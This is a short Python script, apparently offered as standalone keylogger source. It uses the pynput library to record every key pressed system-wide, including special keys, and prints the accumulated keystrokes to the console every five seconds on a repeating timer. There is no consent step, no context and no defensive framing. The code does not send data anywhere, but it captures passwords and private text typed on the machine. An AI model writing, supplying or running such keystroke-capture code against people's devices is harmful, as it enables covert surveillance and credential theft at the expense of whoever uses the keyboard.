#!/usr/bin/env python3
from pynput import keyboard
import threading

log = ""

def process_key_listener(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if(key == key.space):
            log = log + ' '
        else:
            log = log + " " + str(key) + " "

def report():
    global log
    print(log)
    log = ""
    thread = threading.Timer(5, report)  
    thread.start()

with keyboard.Listener(
        on_press=process_key_listener) as listener:
    try:
        report()
        listener.join()
    except Exception as e:
        print('{0} was pressed'.format(e.args[0]))